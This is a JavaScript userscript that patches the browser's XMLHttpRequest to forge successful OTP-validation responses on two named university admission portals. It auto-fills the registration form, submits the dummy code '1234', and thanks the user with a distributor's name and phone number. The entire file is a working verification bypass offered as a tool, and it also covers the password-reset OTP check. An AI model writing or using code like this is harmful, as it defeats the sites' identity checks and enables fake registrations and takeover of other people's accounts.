(function () {
  // ========= 🔐 Intercept OTP XHR Requests (Run on all pages) =========
  const showAlert = (msg) => alert(msg);
  // showAlert("🔧 OTP Interceptor Initialized by SV");

  const OTP_ENDPOINTS = [
    "/applicant-server/o/mql",
    "/server/o/mql",
    "/login-server/o/mql"
  ];

  const FAKE_RESPONSES = {
    ValidateMobileOTPForRegistration: () => ({
      ValidateMobileOTPForRegistration: {
        result: { OTPMobile: "OTPFOUND" },
        error: null,
        errorCode: 0,
        isCompressed: false,
        serverTime: new Date().toISOString()
      }
    }),
    ValidateEmailOTPForRegistration: () => ({
      ValidateEmailOTPForRegistration: {
        result: { emailOTP: "OTPFOUND" },
        error: null,
        errorCode: 1000,
        isCompressed: false,
        serverTime: new Date().toISOString()
      }
    }),
    dbPresentOTPValidate: () => ({
      dbPresentOTPValidate: {
        result: { user: "email@example.com" },
        error: null,
        errorCode: 0,
        isCompressed: false,
        serverTime: new Date().toISOString()
      }
    }),
    OtpVerificationForChangingPassword: () => ({
      OtpVerificationForChangingPassword: {
        result: { resetOTP: "OTPFOUND" },
        error: null,
        errorCode: 1000,
        isCompressed: false,
        serverTime: new Date().toISOString()
      }
    })
  };

  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this._interceptUrl = url;
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    if (typeof body === "string" && OTP_ENDPOINTS.some(ep => this._interceptUrl.includes(ep))) {
      const matchedKey = Object.keys(FAKE_RESPONSES).find(key => body.includes(key));
      if (matchedKey) {
        const fakeResponse = JSON.stringify(FAKE_RESPONSES[matchedKey]());
        const xhr = this;
        const origOnReadyStateChange = xhr.onreadystatechange;

        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            try {
              Object.defineProperty(xhr, "responseText", {
                get: () => fakeResponse
              });
            } catch {
              xhr.responseText = fakeResponse;
            }
          }
          if (typeof origOnReadyStateChange === "function") {
            origOnReadyStateChange.apply(this, arguments);
          }
        };

       // showAlert("✅ OTP Intercepted & Verified\n🔒 Powered by SV");
      }
    }
    return originalSend.apply(this, arguments);
  };

  // ========= 🧠 Automation Only for Specific Page =========
  // ========= 🧠 Automation Only for Specific Page =========
const isOnAllowedPage =
  (location.origin === "https://sndtadm.dulive.ac" || location.origin === "https://ycmouadm.dulive.ac") &&
  location.hash === "#/registration";

if (!isOnAllowedPage) return;

  // ==== User Prompts (email & mobile only) ====
  const email = prompt("📧 Enter your email:");
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return;

  const mobile = prompt("📱 Enter your 10-digit mobile number:");
  if (!mobile || !/^\d{10}$/.test(mobile)) return;

  // ==== Helper: Fill input and trigger events ====
  function fillInput(input, value) {
    if (!input) return;
    input.value = value;
    ["input", "change", "blur"].forEach(evt =>
      input.dispatchEvent(new Event(evt, { bubbles: true }))
    );
  }

  // ==== Fill Mobile Number & Click Send OTP ====
  const mobileInput = document.querySelector("#mobileNo");
  const mobileSendBtn = Array.from(document.querySelectorAll("button"))
    .find(btn => btn.textContent.trim().toLowerCase() === "send otp" && btn.closest('.input-group')?.contains(mobileInput));

  fillInput(mobileInput, mobile);
  mobileSendBtn?.click();

  // ==== Fill Email & Click Send OTP ====
  const emailInput = document.querySelector('input[type="email"], input[name*="email"], #emailOtp');
  const emailSendBtn = Array.from(document.querySelectorAll("button"))
    .find(btn => btn.textContent.trim().toLowerCase() === "send otp" && btn.closest('.input-group')?.contains(emailInput));

  fillInput(emailInput, email);
  emailSendBtn?.click();

  // ==== Auto-fill OTP after delay ====
  setTimeout(() => {
    const mobileOtpInput = document.querySelector("#mobileOtp");
    const mobileConfirmBtn = mobileOtpInput?.closest(".input-group")?.querySelector("button.btn-green-dark");
    fillInput(mobileOtpInput, "1234");
    mobileConfirmBtn?.click();

    const emailOtpInput = document.querySelector("#emailOtp");
    const emailConfirmBtn = emailOtpInput?.closest(".input-group")?.querySelector("button.btn-green-dark");
    fillInput(emailOtpInput, "1234");
    emailConfirmBtn?.click();

    showAlert("✅ OTP Verified Successfully.\nThank you for using our tool.\nSV | Contact: 9921076909");
  }, 2000);
})();
